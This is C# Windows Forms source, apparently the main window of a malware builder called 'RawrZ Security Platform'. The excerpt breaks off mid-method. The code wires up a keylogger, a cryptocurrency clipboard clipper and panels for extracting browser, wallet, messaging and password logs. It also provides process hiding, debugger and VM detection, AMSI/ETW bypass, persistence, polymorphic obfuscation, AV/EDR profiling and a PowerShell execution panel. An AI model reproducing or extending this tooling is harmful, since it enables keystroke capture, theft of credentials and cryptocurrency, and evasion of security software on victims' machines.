using System.Security.Cryptography;
using System.Text;
using RawrZDesktop.Engines;
using RawrZDesktop.Controls;
using RawrZDesktop.Security;
using RawrZDesktop.Stealth;
using RawrZDesktop.AdvancedModules;
using Microsoft.CodeAnalysis;
using Microsoft.CodeAnalysis.CSharp;
using Microsoft.CodeAnalysis.Emit;

namespace RawrZDesktop;

public partial class Form1 : Form
{
    // Form controls
    private Label fileLabel = null!;
    private ComboBox algorithmCombo = null!;
    private ComboBox keySizeCombo = null!;
    private CheckBox compressionCheck = null!;
    private CheckBox obfuscationCheck = null!;
    private TextBox resultsTextBox = null!;
    private Button roslynCompileButton = null!;
    private Button selectEncryptedButton = null!;
    private string? selectedFile;
    private string? selectedEncryptedFile;
    
    // Advanced feature toggles
    private CheckBox stealthModeCheck = null!;
    private CheckBox antiAnalysisCheck = null!;
    private CheckBox polymorphicCheck = null!;
    private CheckBox memoryProtectionCheck = null!;
    private CheckBox networkEvasionCheck = null!;
    private CheckBox persistenceCheck = null!;
    private CheckBox debugModeCheck = null!;
    
    // Engine manager
    private EngineManager engineManager;
    
    // Modern features
    private DragDropHandler? dragDropHandler;
    private BatchProcessor? batchProcessor;
    private CancellationTokenSource? cancellationTokenSource;
    
    // Extraction panel controls
    private TabControl extractionTabControl = null!;
    private RichTextBox browserLogsTextBox = null!;
    private RichTextBox cryptoLogsTextBox = null!;
    private RichTextBox messagingLogsTextBox = null!;
    private RichTextBox cloudLogsTextBox = null!;
    private RichTextBox passwordLogsTextBox = null!;
    private Button refreshBrowserLogsButton = null!;
    private Button refreshCryptoLogsButton = null!;
    private Button refreshMessagingLogsButton = null!;
    private Button refreshCloudLogsButton = null!;
    private Button refreshPasswordLogsButton = null!;
    private Button exportBrowserLogsButton = null!;
    private Button exportCryptoLogsButton = null!;
    private Button exportMessagingLogsButton = null!;
    private Button exportCloudLogsButton = null!;
    private Button exportPasswordLogsButton = null!;

    public Form1()
    {
        try
        {
            InitializeComponent();
            
            // Perform tamper detection before initializing
            try
            {
                // Temporarily disabled for development
                // PerformStartupTamperDetection();
                MessageBox.Show("Tamper detection temporarily disabled for development", "Info", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Tamper detection failed: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            
            // Initialize stealth architecture
            try
            {
                InitializeStealthMode();
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Stealth initialization failed: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            
            try
            {
                engineManager = new EngineManager();
                batchProcessor = new BatchProcessor();
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Engine initialization failed: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            
            try
            {
                SetupFilelessPanel();
                SetupExtractionPanel();
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Panel setup failed: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            
            try
            {
                SetupDragDrop();
                SetupBatchProcessing();
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Additional setup failed: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show($"Form initialization failed: {ex.Message}\n\nStack trace:\n{ex.StackTrace}", "Critical Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            throw;
        }
    }

    private void SetupFilelessPanel()
    {
        this.Text = "RawrZ Security Platform - File Processor";
        this.Size = new Size(1200, 800);
        this.StartPosition = FormStartPosition.CenterScreen;
        
        // Create main tab control with better styling
        var mainTabControl = new TabControl
        {
            Dock = DockStyle.Fill,
            Font = new Font("Arial", 10, FontStyle.Bold),
            Appearance = TabAppearance.Normal,
            ItemSize = new Size(200, 40),
            SizeMode = TabSizeMode.Fixed,
            BackColor = Color.LightGray,
            ForeColor = Color.DarkBlue
        };

        // Add security status tab
        var securityTab = new TabPage("Security Status");
        securityTab.Controls.Add(CreateSecurityStatusPanel());
        mainTabControl.TabPages.Add(securityTab);
        
        // Tab 1: File Operations
        var fileOperationsTab = new TabPage("📁 File Operations");
        fileOperationsTab.BackColor = Color.White;
        var fileOperationsPanel = CreateFileOperationsPanel();
        fileOperationsTab.Controls.Add(fileOperationsPanel);
        mainTabControl.TabPages.Add(fileOperationsTab);
        
        // Tab 2: Processing Settings
        var processingSettingsTab = new TabPage("⚙️ Processing Settings");
        processingSettingsTab.BackColor = Color.White;
        var processingSettingsPanel = CreateProcessingSettingsPanel();
        processingSettingsTab.Controls.Add(processingSettingsPanel);
        mainTabControl.TabPages.Add(processingSettingsTab);
        
        // Tab 3: Advanced Features
        var advancedTab = new TabPage("🚀 Advanced Features");
        advancedTab.BackColor = Color.White;
        var advancedPanel = CreateAdvancedFeaturesPanel();
        advancedTab.Controls.Add(advancedPanel);
        mainTabControl.TabPages.Add(advancedTab);
        
        // Tab 4: Results & Logs
        var resultsTab = new TabPage("📊 Results & Logs");
        resultsTab.BackColor = Color.White;
        var resultsPanel = CreateResultsPanel();
        resultsTab.Controls.Add(resultsPanel);
        mainTabControl.TabPages.Add(resultsTab);
        
        this.Controls.Add(mainTabControl);
    }

    private Panel CreateFileOperationsPanel()
    {
        var panel = new Panel { Dock = DockStyle.Fill, Padding = new Padding(15) };
        
        var fileGroup = new GroupBox
        {
            Text = "📁 File Operations",
            Dock = DockStyle.Top,
            Height = 250,
            Font = new Font("Arial", 10, FontStyle.Bold),
            ForeColor = Color.DarkBlue
        };
        
        var fileLayout = new TableLayoutPanel
        {
            Dock = DockStyle.Fill,
            ColumnCount = 1,
            RowCount = 6,
            Padding = new Padding(10)
        };
        
        // File selection
        var fileButton = new Button
        {
            Text = "📂 Select File",
            Height = 35,
            Anchor = AnchorStyles.Left | AnchorStyles.Right,
            Font = new Font("Arial", 9, FontStyle.Bold),
            BackColor = Color.LightGreen,
            ForeColor = Color.DarkGreen,
            FlatStyle = FlatStyle.Standard
        };
        fileButton.Click += FileButton_Click;
        
        var fileLabel = new Label
        {
            Text = "No file selected",
            Height = 25,
            Anchor = AnchorStyles.Left | AnchorStyles.Right,
            TextAlign = ContentAlignment.MiddleLeft,
            Font = new Font("Arial", 9, FontStyle.Italic),
            ForeColor = Color.Gray,
            BorderStyle = BorderStyle.FixedSingle,
            BackColor = Color.LightGray
        };
        
        // Operation buttons
        var encryptButton = new Button
        {
            Text = "🔒 Process File",
            Height = 35,
            Anchor = AnchorStyles.Left | AnchorStyles.Right,
            Font = new Font("Arial", 9, FontStyle.Bold),
            BackColor = Color.LightCoral,
            ForeColor = Color.DarkRed,
            FlatStyle = FlatStyle.Standard
        };
        encryptButton.Click += EncryptButton_Click;
        
        var decryptButton = new Button
        {
            Text = "🔓 Restore File",
            Height = 35,
            Anchor = AnchorStyles.Left | AnchorStyles.Right,
            Font = new Font("Arial", 9, FontStyle.Bold),
            BackColor = Color.LightBlue,
            ForeColor = Color.DarkBlue,
            FlatStyle = FlatStyle.Standard
        };
        decryptButton.Click += DecryptButton_Click;
        
        var selectEncryptedButton = new Button
        {
            Text = "📄 Select Processed File (.enc)",
            Height = 35,
            Anchor = AnchorStyles.Left | AnchorStyles.Right,
            BackColor = Color.LightYellow,
            ForeColor = Color.DarkOrange,
            Font = new Font("Arial", 9, FontStyle.Bold),
            FlatStyle = FlatStyle.Standard
        };
        selectEncryptedButton.Click += SelectEncryptedButton_Click;
        
        var roslynCompileButton = new Button
        {
            Text = "⚙️ Roslyn Compile (.enc → .exe)",
            Height = 35,
            Anchor = AnchorStyles.Left | AnchorStyles.Right,
            BackColor = Color.LightSteelBlue,
            ForeColor = Color.DarkSlateBlue,
            Font = new Font("Arial", 9, FontStyle.Bold),
            FlatStyle = FlatStyle.Standard
        };
        roslynCompileButton.Click += RoslynCompileButton_Click;
        
        var batchEncryptButton = new Button
        {
            Text = "📦 Batch Process Multiple Files",
            Height = 35,
            Anchor = AnchorStyles.Left | AnchorStyles.Right,
            BackColor = Color.Orange,
            ForeColor = Color.White,
            Font = new Font("Arial", 9, FontStyle.Bold),
            FlatStyle = FlatStyle.Standard
        };
        batchEncryptButton.Click += BatchEncryptButton_Click;
        
        fileLayout.Controls.Add(fileButton, 0, 0);
        fileLayout.Controls.Add(fileLabel, 0, 1);
        fileLayout.Controls.Add(encryptButton, 0, 2);
        fileLayout.Controls.Add(decryptButton, 0, 3);
        fileLayout.Controls.Add(selectEncryptedButton, 0, 4);
        fileLayout.Controls.Add(roslynCompileButton, 0, 5);
        fileLayout.Controls.Add(batchEncryptButton, 0, 6);
        
        fileGroup.Controls.Add(fileLayout);
        panel.Controls.Add(fileGroup);
        
        // Store references for later use
        this.fileLabel = fileLabel;
        this.roslynCompileButton = roslynCompileButton;
        this.selectEncryptedButton = selectEncryptedButton;
        this.selectedFile = null;
        
        return panel;
    }

    private Panel CreateProcessingSettingsPanel()
    {
        var panel = new Panel { Dock = DockStyle.Fill, Padding = new Padding(15) };
        
        var settingsGroup = new GroupBox
        {
            Text = "⚙️ Processing Settings",
            Dock = DockStyle.Top,
            Height = 350,
            Font = new Font("Arial", 10, FontStyle.Bold),
            ForeColor = Color.DarkBlue
        };
        
        var settingsLayout = new TableLayoutPanel
        {
            Dock = DockStyle.Fill,
            ColumnCount = 2,
            RowCount = 7,
            Padding = new Padding(10)
        };
        
        // Set column styles for better alignment
        settingsLayout.ColumnStyles.Add(new ColumnStyle(SizeType.Absolute, 120F)); // Fixed width for labels
        settingsLayout.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 100F));   // Flexible width for controls
        
        // Algorithm selection
        var algorithmLabel = new Label 
        { 
            Text = "Method:",
            Anchor = AnchorStyles.Left | AnchorStyles.Right,
            TextAlign = ContentAlignment.MiddleLeft,
            Font = new Font("Arial", 9, FontStyle.Bold),
            ForeColor = Color.DarkSlateGray
        };
        settingsLayout.Controls.Add(algorithmLabel, 0, 0);
        
        var algorithmCombo = new ComboBox
        {
            DropDownStyle = ComboBoxStyle.DropDownList,
            Anchor = AnchorStyles.Left | AnchorStyles.Right,
            Height = 25,
            Font = new Font("Arial", 9),
            BackColor = Color.White
        };
        // Add all available engines with modern options first
        var engines = engineManager.GetAvailableEngines().ToArray();
        algorithmCombo.Items.AddRange(engines);
        
        // Set ModernCrypto as default if available
        var modernCryptoIndex = Array.IndexOf(engines, "ModernCrypto");
        algorithmCombo.SelectedIndex = modernCryptoIndex >= 0 ? modernCryptoIndex : 0;
        settingsLayout.Controls.Add(algorithmCombo, 1, 0);
        
        // Key size
        var keySizeLabel = new Label 
        { 
            Text = "Key Size:",
            Anchor = AnchorStyles.Left | AnchorStyles.Right,
            TextAlign = ContentAlignment.MiddleLeft,
            Font = new Font("Arial", 9, FontStyle.Bold),
            ForeColor = Color.DarkSlateGray
        };
        settingsLayout.Controls.Add(keySizeLabel, 0, 1);
        
        var keySizeCombo = new ComboBox
        {
            DropDownStyle = ComboBoxStyle.DropDownList,
            Anchor = AnchorStyles.Left | AnchorStyles.Right,
            Height = 25,
            Font = new Font("Arial", 9),
            BackColor = Color.White
        };
        keySizeCombo.Items.AddRange(new[] { "128 bits", "192 bits", "256 bits" });
        keySizeCombo.SelectedIndex = 2;
        settingsLayout.Controls.Add(keySizeCombo, 1, 1);
        
        // Fileless processing info
        var filelessLabel = new Label 
        { 
            Text = "Fileless Processing:",
            Anchor = AnchorStyles.Left | AnchorStyles.Right,
            TextAlign = ContentAlignment.MiddleLeft,
            Font = new Font("Arial", 9, FontStyle.Bold),
            ForeColor = Color.DarkSlateGray
        };
        settingsLayout.Controls.Add(filelessLabel, 0, 2);
        
        var filelessInfoBox = new TextBox
        {
            Text = "Auto-generated keys - No passwords needed",
            ReadOnly = true,
            Anchor = AnchorStyles.Left | AnchorStyles.Right,
            Height = 25,
            Font = new Font("Arial", 9),
            BackColor = Color.LightGreen
        };
        settingsLayout.Controls.Add(filelessInfoBox, 1, 2);
        
        // Compression
        var compressionCheck = new CheckBox
        {
            Text = "🗜️ Enable Compression (Reduce file size before processing)",
            Anchor = AnchorStyles.Left,
            Font = new Font("Arial", 9),
            ForeColor = Color.DarkGreen,
            Height = 30
        };
        settingsLayout.Controls.Add(compressionCheck, 0, 3);
        settingsLayout.SetColumnSpan(compressionCheck, 2);
        
        // Obfuscation
        var obfuscationCheck = new CheckBox
        {
            Text = "🔀 Enable Obfuscation (Add random data to confuse analysis)",
            Anchor = AnchorStyles.Left,
            Font = new Font("Arial", 9),
            ForeColor = Color.DarkOrange,
            Height = 30
        };
        settingsLayout.Controls.Add(obfuscationCheck, 0, 4);
        settingsLayout.SetColumnSpan(obfuscationCheck, 2);
        
        // Fileless processing status
        var filelessStatusLabel = new Label
        {
            Text = "✅ Fileless Processing Active - All keys auto-generated",
            Anchor = AnchorStyles.Left,
            Font = new Font("Arial", 9, FontStyle.Bold),
            ForeColor = Color.DarkGreen,
            Height = 30
        };
        settingsLayout.Controls.Add(filelessStatusLabel, 0, 5);
        settingsLayout.SetColumnSpan(filelessStatusLabel, 2);
        
        settingsGroup.Controls.Add(settingsLayout);
        panel.Controls.Add(settingsGroup);
        
        // Store references
        this.algorithmCombo = algorithmCombo;
        this.keySizeCombo = keySizeCombo;
        this.compressionCheck = compressionCheck;
        this.obfuscationCheck = obfuscationCheck;
        
        return panel;
    }

    private Panel CreateAdvancedFeaturesPanel()
    {
        var panel = new Panel { Dock = DockStyle.Fill, Padding = new Padding(15) };
        
        // Advanced Features Group
        var advancedGroup = new GroupBox
        {
            Text = "🚀 Advanced Security Features",
            Dock = DockStyle.Top,
            Height = 450,
            Font = new Font("Arial", 10, FontStyle.Bold),
            ForeColor = Color.DarkBlue
        };
        
        var advancedLayout = new TableLayoutPanel
        {
            Dock = DockStyle.Fill,
            ColumnCount = 1,
            RowCount = 9,
            Padding = new Padding(10)
        };
        
        // Add description label
        var descriptionLabel = new Label
        {
            Text = "Select advanced security features to enhance your file processing operations:",
            Height = 35,
            Anchor = AnchorStyles.Left | AnchorStyles.Right,
            ForeColor = Color.DarkBlue,
            Font = new Font("Arial", 9, FontStyle.Italic),
            TextAlign = ContentAlignment.MiddleCenter,
            BorderStyle = BorderStyle.FixedSingle,
            BackColor = Color.LightCyan
        };
        advancedLayout.Controls.Add(descriptionLabel, 0, 0);
        
        // Stealth Mode
        var stealthModeCheck = new CheckBox
        {
            Text = "🕵️ Stealth Mode (Hide from process lists)",
            Anchor = AnchorStyles.Left,
            ForeColor = Color.DarkGreen,
            Height = 35,
            Font = new Font("Arial", 9, FontStyle.Bold),
            BackColor = Color.LightGreen
        };
        advancedLayout.Controls.Add(stealthModeCheck, 0, 1);
        
        // Anti-Analysis
        var antiAnalysisCheck = new CheckBox
        {
            Text = "🛡️ Anti-Analysis (Detect debuggers & VMs)",
            Anchor = AnchorStyles.Left,
            ForeColor = Color.DarkBlue,
            Height = 35,
            Font = new Font("Arial", 9, FontStyle.Bold),
            BackColor = Color.LightBlue
        };
        advancedLayout.Controls.Add(antiAnalysisCheck, 0, 2);
        
        // Polymorphic
        var polymorphicCheck = new CheckBox
        {
            Text = "🔄 Polymorphic (Change code structure)",
            Anchor = AnchorStyles.Left,
            ForeColor = Color.Purple,
            Height = 35,
            Font = new Font("Arial", 9, FontStyle.Bold),
            BackColor = Color.Lavender
        };
        advancedLayout.Controls.Add(polymorphicCheck, 0, 3);
        
        // Memory Protection
        var memoryProtectionCheck = new CheckBox
        {
            Text = "🧠 Memory Protection (Anti-dump)",
            Anchor = AnchorStyles.Left,
            ForeColor = Color.DarkRed,
            Height = 35,
            Font = new Font("Arial", 9, FontStyle.Bold),
            BackColor = Color.LightPink
        };
        advancedLayout.Controls.Add(memoryProtectionCheck, 0, 4);
        
        // Network Evasion
        var networkEvasionCheck = new CheckBox
        {
            Text = "🌐 Network Evasion (Proxy chains)",
            Anchor = AnchorStyles.Left,
            ForeColor = Color.DarkOrange,
            Height = 35,
            Font = new Font("Arial", 9, FontStyle.Bold),
            BackColor = Color.LightYellow
        };
        advancedLayout.Controls.Add(networkEvasionCheck, 0, 5);
        
        // Persistence
        var persistenceCheck = new CheckBox
        {
            Text = "⚡ Persistence (Auto-startup)",
            Anchor = AnchorStyles.Left,
            ForeColor = Color.DarkMagenta,
            Height = 35,
            Font = new Font("Arial", 9, FontStyle.Bold),
            BackColor = Color.LightCoral
        };
        advancedLayout.Controls.Add(persistenceCheck, 0, 6);
        
        // Debug Mode
        var debugModeCheck = new CheckBox
        {
            Text = "🐛 Debug Mode (Verbose logging)",
            Anchor = AnchorStyles.Left,
            ForeColor = Color.Gray,
            Height = 35,
            Font = new Font("Arial", 9, FontStyle.Bold),
            BackColor = Color.LightGray
        };
        advancedLayout.Controls.Add(debugModeCheck, 0, 7);
        
        // Advanced Actions Button
        var advancedActionsButton = new Button
        {
            Text = "🚀 Execute Advanced Features",
            Height = 45,
            Anchor = AnchorStyles.Left | AnchorStyles.Right,
            BackColor = Color.Orange,
            ForeColor = Color.White,
            Font = new Font("Arial", 11, FontStyle.Bold),
            FlatStyle = FlatStyle.Standard
        };
        advancedActionsButton.Click += AdvancedActionsButton_Click;
        advancedLayout.Controls.Add(advancedActionsButton, 0, 8);
        
        advancedGroup.Controls.Add(advancedLayout);
        panel.Controls.Add(advancedGroup);
        
        // Store references
        this.stealthModeCheck = stealthModeCheck;
        this.antiAnalysisCheck = antiAnalysisCheck;
        this.polymorphicCheck = polymorphicCheck;
        this.memoryProtectionCheck = memoryProtectionCheck;
        this.networkEvasionCheck = networkEvasionCheck;
        this.persistenceCheck = persistenceCheck;
        this.debugModeCheck = debugModeCheck;
        
        return panel;
    }
    
    private Panel CreateResultsPanel()
    {
        var panel = new Panel { Dock = DockStyle.Fill, Padding = new Padding(15) };
        
        // Results Group
        var resultsGroup = new GroupBox
        {
            Text = "📊 Operation Results & Logs",
            Dock = DockStyle.Fill,
            Font = new Font("Arial", 10, FontStyle.Bold),
            ForeColor = Color.DarkBlue
        };
        
        var resultsLayout = new TableLayoutPanel
        {
            Dock = DockStyle.Fill,
            ColumnCount = 1,
            RowCount = 3,
            Padding = new Padding(10)
        };
        
        // Add description
        var descriptionLabel = new Label
        {
            Text = "View real-time results and logs from all file processing operations:",
            Height = 30,
            Anchor = AnchorStyles.Left | AnchorStyles.Right,
            ForeColor = Color.DarkBlue,
            Font = new Font("Arial", 9, FontStyle.Italic),
            TextAlign = ContentAlignment.MiddleCenter,
            BorderStyle = BorderStyle.FixedSingle,
            BackColor = Color.LightCyan
        };
        resultsLayout.Controls.Add(descriptionLabel, 0, 0);
        
        // Add status bar
        var statusLabel = new Label
        {
            Text = "Ready - Select operations from other tabs to see results here",
            Height = 25,
            Anchor = AnchorStyles.Left | AnchorStyles.Right,
            ForeColor = Color.DarkGreen,
            Font = new Font("Arial", 9, FontStyle.Bold),
            TextAlign = ContentAlignment.MiddleLeft,
            BorderStyle = BorderStyle.FixedSingle,
            BackColor = Color.LightGreen
        };
        resultsLayout.Controls.Add(statusLabel, 0, 1);
        
        // Results text box
        var resultsTextBox = new TextBox
        {
            Multiline = true,
            ScrollBars = ScrollBars.Vertical,
            ReadOnly = true,
            Dock = DockStyle.Fill,
            Font = new Font("Consolas", 9),
            BackColor = Color.Black,
            ForeColor = Color.LimeGreen,
            BorderStyle = BorderStyle.Fixed3D
        };
        resultsLayout.Controls.Add(resultsTextBox, 0, 2);
        
        resultsGroup.Controls.Add(resultsLayout);
        panel.Controls.Add(resultsGroup);
        
        // Store reference
        this.resultsTextBox = resultsTextBox;
        
        return panel;
    }

    private Panel CreateSecurityStatusPanel()
    {
        var panel = new Panel
        {
            Dock = DockStyle.Fill,
            Padding = new Padding(20),
            BackColor = Color.White
        };

        var titleLabel = new Label
        {
            Text = "🛡️ Security Status & Tamper Detection",
            Font = new Font("Arial", 16, FontStyle.Bold),
            ForeColor = Color.DarkRed,
            AutoSize = true,
            Location = new Point(20, 20)
        };

        var statusPanel = new Panel
        {
            Location = new Point(20, 60),
            Size = new Size(800, 400),
            BorderStyle = BorderStyle.FixedSingle,
            BackColor = Color.LightYellow
        };

        var statusLabel = new Label
        {
            Text = "Security Status:",
            Font = new Font("Arial", 12, FontStyle.Bold),
            Location = new Point(10, 10),
            AutoSize = true
        };

        var statusText = new TextBox
        {
            Multiline = true,
            ScrollBars = ScrollBars.Vertical,
            Location = new Point(10, 40),
            Size = new Size(780, 300),
            Font = new Font("Consolas", 10),
            ReadOnly = true,
            BackColor = Color.Black,
            ForeColor = Color.LimeGreen
        };

        var refreshButton = new Button
        {
            Text = "🔄 Refresh Security Status",
            Location = new Point(20, 480),
            Size = new Size(200, 40),
            BackColor = Color.LightBlue,
            Font = new Font("Arial", 10, FontStyle.Bold)
        };
        refreshButton.Click += (s, e) => RefreshSecurityStatus(statusText);

        var testButton = new Button
        {
            Text = "🧪 Test Tamper Detection",
            Location = new Point(240, 480),
            Size = new Size(200, 40),
            BackColor = Color.LightCoral,
            Font = new Font("Arial", 10, FontStyle.Bold)
        };
        testButton.Click += (s, e) => TestTamperDetection(statusText);

        var stealthButton = new Button
        {
            Text = "🛡️ Initialize Stealth Mode",
            Location = new Point(460, 480),
            Size = new Size(200, 40),
            BackColor = Color.DarkGreen,
            ForeColor = Color.White,
            Font = new Font("Arial", 10, FontStyle.Bold)
        };
        stealthButton.Click += (s, e) => InitializeStealthMode();

        var profileButton = new Button
        {
            Text = "📊 System Profiling",
            Location = new Point(680, 480),
            Size = new Size(200, 40),
            BackColor = Color.DarkBlue,
            ForeColor = Color.White,
            Font = new Font("Arial", 10, FontStyle.Bold)
        };
        profileButton.Click += (s, e) => PerformSystemProfiling(statusText);

        var keyloggerButton = new Button
        {
            Text = "⌨️ Start Keylogger",
            Location = new Point(20, 530),
            Size = new Size(200, 40),
            BackColor = Color.DarkRed,
            ForeColor = Color.White,
            Font = new Font("Arial", 10, FontStyle.Bold)
        };
        keyloggerButton.Click += (s, e) => ToggleKeylogger(statusText);

        var clipperButton = new Button
        {
            Text = "💰 Start Clipper",
            Location = new Point(240, 530),
            Size = new Size(200, 40),
            BackColor = Color.DarkOrange,
            ForeColor = Color.White,
            Font = new Font("Arial", 10, FontStyle.Bold)
        };
        clipperButton.Click += (s, e) => ToggleClipper(statusText);

        var powershellButton = new Button
        {
            Text = "💻 PowerShell",
            Location = new Point(460, 530),
            Size = new Size(200, 40),
            BackColor = Color.Purple,
            ForeColor = Color.White,
            Font = new Font("Arial", 10, FontStyle.Bold)
        };
        powershellButton.Click += (s, e) => OpenPowerShellPanel(statusText);

        statusPanel.Controls.Add(statusLabel);
        statusPanel.Controls.Add(statusText);

        panel.Controls.Add(titleLabel);
        panel.Controls.Add(statusPanel);
        panel.Controls.Add(refreshButton);
        panel.Controls.Add(testButton);
        panel.Controls.Add(stealthButton);
        panel.Controls.Add(profileButton);
        panel.Controls.Add(keyloggerButton);
        panel.Controls.Add(clipperButton);
        panel.Controls.Add(powershellButton);

        // Initial status check
        RefreshSecurityStatus(statusText);

        return panel;
    }

    private async void InitializeStealthMode()
    {
        try
        {
            var stealthInitialized = await StealthArchitecture.InitializeStealthMode();
            if (stealthInitialized)
            {
                resultsTextBox?.AppendText("🛡️ Stealth Architecture: ENABLED\r\n");
                resultsTextBox?.AppendText("🔒 AMSI/ETW Bypass: ACTIVE\r\n");
                resultsTextBox?.AppendText("💾 Zero Disk Writes: ENABLED\r\n");
                resultsTextBox?.AppendText("🔐 Secure Communication: INITIALIZED\r\n");
            }
            else
            {
                resultsTextBox?.AppendText("⚠️ Stealth Architecture: DISABLED (Environment not suitable)\r\n");
            }
        }
        catch (Exception ex)
        {
            resultsTextBox?.AppendText($"❌ Stealth initialization failed: {ex.Message}\r\n");
        }
    }

    private async void PerformSystemProfiling(TextBox statusText)
    {
        try
        {
            statusText.AppendText($"\r\n📊 Starting comprehensive system profiling...\r\n");
            
            var profile = await StealthArchitecture.PerformSystemProfiling();
            
            statusText.AppendText($"\r\n=== SYSTEM PROFILE REPORT ===\r\n");
            statusText.AppendText($"🖥️ Hardware:\r\n");
            statusText.AppendText($"   • CPU: {profile.Hardware.CpuInfo}\r\n");
            statusText.AppendText($"   • RAM: {profile.Hardware.RamInfo}\r\n");
            statusText.AppendText($"   • Screen: {profile.Hardware.ScreenResolution}\r\n");
            
            statusText.AppendText($"\r\n💻 Software:\r\n");
            statusText.AppendText($"   • OS: {profile.Software.OperatingSystem}\r\n");
            statusText.AppendText($"   • Architecture: {profile.Software.Architecture}\r\n");
            statusText.AppendText($"   • Installed Software: {profile.Software.InstalledSoftware.Count} items\r\n");
            
            statusText.AppendText($"\r\n👤 User Data:\r\n");
            statusText.AppendText($"   • Username: {profile.UserData.Username}\r\n");
            statusText.AppendText($"   • Machine: {profile.UserData.MachineName}\r\n");
            statusText.AppendText($"   • Domain: {profile.UserData.UserDomain}\r\n");
            
            statusText.AppendText($"\r\n🌐 Network:\r\n");
            statusText.AppendText($"   • Host: {profile.Network.HostName}\r\n");
            statusText.AppendText($"   • Interfaces: {profile.Network.NetworkInterfaces.Count}\r\n");
            
            statusText.AppendText($"\r\n🛡️ Security Software:\r\n");
            statusText.AppendText($"   • Antivirus: {string.Join(", ", profile.SecuritySoftware.DetectedAntivirus)}\r\n");
            statusText.AppendText($"   • EDR: {string.Join(", ", profile.SecuritySoftware.DetectedEdr)}\r\n");
            
            statusText.AppendText($"\r\n=== PROFILE COMPLETED ===\r\n\r\n");
        }
        catch (Exception ex)
        {
            statusText.AppendText($"❌ System profiling failed: {ex.Message}\r\n");
        }
    }

    private static bool _keyloggerRunning = false;
    private static bool _clipperRunning = false;

    private void ToggleKeylogger(TextBox statusText)
    {
        try
        {
            if (!_keyloggerRunning)
            {
                Keylogger.StartKeylogger();
                _keyloggerRunning = true;
                statusText.AppendText("⌨️ Keylogger: STARTED\r\n");
                statusText.AppendText("   • Monitoring keyboard input\r\n");
                statusText.AppendText("   • Saving to: %APPDATA%\\RawrZ\\keylog.txt\r\n");
            }
            else
            {
                Keylogger.StopKeylogger();
                _keyloggerRunning = false;
                statusText.AppendText("⌨️ Keylogger: STOPPED\r\n");
            }
        }
        catch (Exception ex)
        {
            statusText.AppendText($"❌ Keylogger error: {ex.Message}\r\n");
        }
    }

    private void ToggleClipper(TextBox statusText)
    {
        try
        {
            if (!_clipperRunning)
            {
                ClipperModule.StartClipper();
                _clipperRunning = true;
                statusText.AppendText("💰 Clipper: STARTED\r\n");
                statusText.AppendText("   • Monitoring clipboard for crypto addresses\r\n");
                statusText.AppendText("   • Supported: BTC, ETH, XMR, TON, LTC, BCH, DOGE, DASH\r\n");
            }
            else
            {
                ClipperModule.StopClipper();
                _clipperRunning = false;
                statusText.AppendText("💰 Clipper: STOPPED\r\n");
            }
        }
        catch (Exception ex)
        {
            statusText.AppendText($"❌ Clipper error: {ex.Message}\r\n");
        }
    }

    private void OpenPowerShellPanel(TextBox statusText)
    {
        try
        {
            var form = new Form
            {
                Text = "PowerShell Integration",
                Size = new Size(800, 600),
                StartPosition = FormStartPosition.CenterParent
            };

            var scriptBox = new TextBox
            {
                Multiline = true,
                ScrollBars = ScrollBars.Vertical,
                Location = new Point(10, 10),
                Size = new Size(760, 400),
                Text = "Write-Host 'Hello from RawrZ PowerShell Integration!'\nGet-Process | Select-Object -First 5"
            };

            var executeButton = new Button
            {
                Text = "Execute Script",
                Location = new Point(10, 420),
                Size = new Size(120, 30),
                BackColor = Color.Green,
                ForeColor = Color.White
            };

            var outputBox = new TextBox
            {
                Multiline = true,
                ScrollBars = ScrollBars.Vertical,
                Location = new Point(10, 460),
                Size = new Size(760, 100),
                ReadOnly = true,
                BackColor = Color.Black,
                ForeColor = Color.Lime
            };

            executeButton.Click += async (s, e) =>
            {
                try
                {
                    outputBox.Clear();
                    outputBox.AppendText("Executing PowerShell script...\r\n");
                    
                    var result = await PowerShellIntegration.ExecuteScript(scriptBox.Text, true);
                    
                    if (result.Success)
                    {
                        outputBox.AppendText("✅ Execution successful!\r\n");
                        outputBox.AppendText($"Output:\r\n{result.Output}\r\n");
                    }
                    else
                    {
                        outputBox.AppendText($"❌ Execution failed: {result.Error}\r\n");
                    }
                }
                catch (Exception ex)
                {
                    outputBox.AppendText($"❌ Error: {ex.Message}\r\n");
                }
            };

            form.Controls.Add(scriptBox);
            form.Controls.Add(executeButton);
            form.Controls.Add(outputBox);
            form.ShowDialog();
        }
        catch (Exception ex)
        {
            statusText.AppendText($"❌ PowerShell panel error: {ex.Message}\r\n");
        }
    }

    private void RefreshSecurityStatus(TextBox statusText)
    {
        try
        {
            var result = TamperDetection.PerformTamperDetection();
            
            var status = new StringBuilder();
            status.AppendLine($"Security Status Report - {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
            status.AppendLine("=" + new string('=', 50));
            status.AppendLine();
            
            status.AppendLine($"🔍 Overall Status: {(result.IsTampered ? "❌ COMPROMISED" : "✅ SECURE")}");
            status.AppendLine();
            
            status.AppendLine("📊 Detailed Analysis:");
            status.AppendLine($"   • Executable Integrity: {(result.ExecutableTampered ? "❌ TAMPERED" : "✅ VERIFIED")}");
            status.AppendLine($"   • Debugger Detection: {(result.DebuggerDetected ? "❌ DETECTED" : "✅ CLEAR")}");
            status.AppendLine($"   • Virtual Machine: {(result.VirtualMachineDetected ? "⚠️ DETECTED" : "✅ CLEAR")}");
            status.AppendLine($"   • Analysis Tools: {(result.AnalysisToolsDetected ? "❌ DETECTED" : "✅ CLEAR")}");
            status.AppendLine($"   • Memory Integrity: {(result.MemoryTampered ? "❌ TAMPERED" : "✅ VERIFIED")}");
            status.AppendLine();
            
            if (result.IsTampered)
            {
                status.AppendLine("🚨 SECURITY WARNINGS:");
                if (result.ExecutableTampered)
